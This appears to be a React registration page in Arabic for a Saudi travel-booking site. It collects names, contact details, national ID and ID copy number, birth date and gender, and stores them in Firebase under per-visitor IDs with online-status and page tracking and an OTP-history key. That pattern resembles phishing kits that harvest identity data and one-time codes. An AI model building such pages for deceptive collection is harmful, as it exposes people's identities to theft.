import { useState } from "react";
import { ChevronRight, User, Mail, Lock, Phone, IdCard, CalendarDays, FileText } from "lucide-react";
import { Link, useLocation } from "wouter";
import { BottomNav } from "./services";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import SiteHeader from "@/components/site-header";
import SiteFooter from "@/components/site-footer";

type FormState = {
  firstName: string;
  lastName: string;
  email: string;
  password: string;
  countryCode: string;
  phone: string;
  nationalId: string;
  copyNumber: string;
  gender: string;
  birthDate: string;
};

export default function Register() {
  const [, setLocation] = useLocation();
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [form, setForm] = useState<FormState>({
    firstName: "",
    lastName: "",
    email: "",
    password: "",
    countryCode: "966",
    phone: "",
    nationalId: "",
    copyNumber: "",
    gender: "ذكر",
    birthDate: "",
  });

  const update = (key: keyof FormState, val: string) =>
    setForm((f) => ({ ...f, [key]: val }));

  const handleSubmit = async () => {
    if (submitting) return;
    setError("");
    if (!form.firstName.trim() || !form.email.trim() || !form.phone.trim()) {
      setError("يرجى تعبئة الاسم والبريد الإلكتروني ورقم الجوال");
      return;
    }
    setSubmitting(true);
    const visitorId = `visitor_${Date.now()}_${Math.random()
      .toString(36)
      .substring(2, 9)}`;
    const fullName = `${form.firstName} ${form.lastName}`.trim();
    const phoneFull = `${form.countryCode}${form.phone.replace(/^\+?966/, "")}`;
    const ok = await addData({
      id: visitorId,
      name: fullName,
      email: form.email,
      phone: phoneFull,
      saudiId: form.nationalId,
      gender: form.gender,
      birthDate: form.birthDate,
      currentPage: "registration",
    });
    if (!ok) {
      setError("تعذر إكمال التسجيل، يرجى المحاولة مرة أخرى");
      setSubmitting(false);
      return;
    }
    localStorage.setItem("visitor", visitorId);
    localStorage.removeItem("otpHistory");
    setupOnlineStatus(visitorId);
    setLocation("/trip-booking");
  };

  const inputCls =
    "w-full bg-background border-2 border-border rounded-xl px-4 py-3 pr-11 text-sm text-foreground placeholder:text-muted-foreground/60 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/10 transition-all";

  const Field = ({
    label,
    icon: Icon,
    children,
  }: {
    label: string;
    icon: React.ComponentType<{ className?: string }>;
    children: React.ReactNode;
  }) => (
    <div className="space-y-1.5">
      <label className="text-xs font-bold text-foreground/80 block text-right">
        {label}
      </label>
      <div className="relative">
        <Icon className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
        {children}
      </div>
    </div>
  );

  return (
    <div
      className="min-h-screen bg-background flex flex-col"
      dir="rtl"
      data-testid="page-register"
    >
      <SiteHeader />

      <div className="relative bg-gradient-to-l from-primary via-primary to-primary/80 overflow-hidden">
        <div className="absolute inset-0 opacity-10 pointer-events-none">
          <div className="absolute -top-20 -right-20 w-64 h-64 rounded-full bg-white blur-3xl" />
          <div className="absolute -bottom-20 -left-20 w-72 h-72 rounded-full bg-white blur-3xl" />
        </div>
        <div className="relative max-w-3xl mx-auto px-6 pt-8 pb-16">
          <Link
            href="/"
            className="inline-flex items-center justify-center w-9 h-9 rounded-full bg-white/15 text-primary-foreground hover:bg-white/25 transition-colors backdrop-blur-sm"
            data-testid="link-back-home"
          >
            <ChevronRight className="w-5 h-5" />
          </Link>
          <h1 className="text-3xl font-extrabold text-primary-foreground mt-5 text-right">
            إنشاء حساب جديد
          </h1>
          <p className="text-primary-foreground/85 text-sm mt-2 text-right">
            انضم إلينا لتجربة سفر سلسة وعروض حصرية على رحلاتك
          </p>
        </div>
      </div>

      <div className="flex-1 max-w-3xl mx-auto w-full px-4 -mt-10 pb-10">
        <div className="bg-card rounded-3xl shadow-xl border border-border/60 p-6 sm:p-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <Field label="الاسم الأول" icon={User}>
              <input
                type="text"
                placeholder="ادخل الاسم الأول"
                value={form.firstName}
                onChange={(e) => update("firstName", e.target.value)}
                className={inputCls}
                data-testid="input-firstName"
              />
            </Field>
            <Field label="الاسم الأخير" icon={User}>
              <input
                type="text"
                placeholder="ادخل الاسم الأخير"
                value={form.lastName}
                onChange={(e) => update("lastName", e.target.value)}
                className={inputCls}
                data-testid="input-lastName"
              />
            </Field>
            <Field label="البريد الإلكتروني" icon={Mail}>
              <input
                type="email"
                placeholder="example@mail.com"
                value={form.email}
                onChange={(e) => update("email", e.target.value)}
                className={inputCls}
                data-testid="input-email"
              />
            </Field>
            <Field label="كلمة المرور" icon={Lock}>
              <input
                type="password"
                placeholder="••••••••••"
                value={form.password}
                onChange={(e) => update("password", e.target.value)}
                className={inputCls}
                data-testid="input-password"
              />
            </Field>

            <div className="space-y-1.5 sm:col-span-2">
              <label className="text-xs font-bold text-foreground/80 block text-right">
                رقم الجوال
              </label>
              <div className="flex gap-2">
                <div className="relative flex-1">
                  <Phone className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                  <input
                    type="tel"
                    placeholder="55xxxxxxx"
                    value={form.phone}
                    onChange={(e) => update("phone", e.target.value)}
                    className={inputCls}
                    data-testid="input-phone"
                  />
                </div>
                <div className="bg-muted border-2 border-border rounded-xl px-3 py-3 flex items-center gap-1.5 text-sm font-bold text-foreground">
                  <span>+</span>
                  <input
                    type="text"
                    value={form.countryCode}
                    onChange={(e) => update("countryCode", e.target.value)}
                    className="w-10 bg-transparent text-center focus:outline-none"
                    data-testid="input-country-code"
                  />
                </div>
              </div>
            </div>

            <Field label="رقم الهوية الوطنية" icon={IdCard}>
              <input
                type="text"
                placeholder="10xxxxxxxx"
                value={form.nationalId}
                onChange={(e) => update("nationalId", e.target.value)}
                className={inputCls}
                data-testid="input-national-id"
              />
            </Field>
            <Field label="رقم النسخة" icon={FileText}>
              <input
                type="text"
                placeholder="1000000008"
                value={form.copyNumber}
                onChange={(e) => update("copyNumber", e.target.value)}
                className={inputCls}
                data-testid="input-copy-number"
              />
            </Field>

            <div className="space-y-1.5">
              <label className="text-xs font-bold text-foreground/80 block text-right">
                الجنس
              </label>
              <div className="relative">
                <User className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
                <select
                  value={form.gender}
                  onChange={(e) => update("gender", e.target.value)}
                  className={`${inputCls} cursor-pointer appearance-none`}
                  data-testid="select-gender"
                >
                  <option value="ذكر">ذكر</option>
                  <option value="أنثى">أنثى</option>
                </select>
              </div>
            </div>
            <Field label="تاريخ الميلاد" icon={CalendarDays}>
              <input
                type="date"
                value={form.birthDate}
                onChange={(e) => update("birthDate", e.target.value)}
                className={inputCls}
                data-testid="input-birth-date"
              />
            </Field>
          </div>

          {error && (
            <div
              className="mt-5 bg-destructive/10 border border-destructive/30 text-destructive rounded-xl px-4 py-3 text-sm text-center font-medium"
              data-testid="error-register"
            >
              {error}
            </div>
          )}

          <button
            onClick={() => void handleSubmit()}
            disabled={submitting}
            className="w-full mt-6 bg-primary text-primary-foreground py-4 rounded-xl font-extrabold text-base shadow-lg shadow-primary/25 hover:shadow-xl hover:shadow-primary/35 hover:-translate-y-0.5 transition-all duration-300 disabled:opacity-60 disabled:cursor-not-allowed disabled:transform-none"
            data-testid="button-submit-register"
          >
            {submitting ? "جاري الإرسال..." : "تسجيل"}
          </button>

          <p className="text-center text-xs text-muted-foreground mt-4">
            بإنشاء الحساب فإنك توافق على شروط الاستخدام وسياسة الخصوصية
          </p>
        </div>
      </div>

      <SiteFooter />
      <BottomNav active="التسجيل" />
    </div>
  );
}
